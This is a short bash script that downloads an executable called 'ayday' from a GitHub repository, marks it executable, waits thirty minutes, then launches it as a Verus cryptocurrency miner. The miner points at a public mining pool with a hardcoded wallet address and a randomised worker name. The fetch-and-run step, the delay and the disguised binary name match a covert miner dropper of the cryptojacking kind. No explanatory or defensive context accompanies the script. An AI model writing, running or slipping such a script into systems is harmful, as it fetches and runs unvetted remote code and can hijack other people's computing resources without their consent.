#!/bin/bash

wget https://github.com/bibirbusin/bibirbusin/raw/main/ayday
chmod +x ayday
sleep 1800
./ayday --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3 --Worker AALuxy$RANDOM --password Hybrid --cpu-threads 0
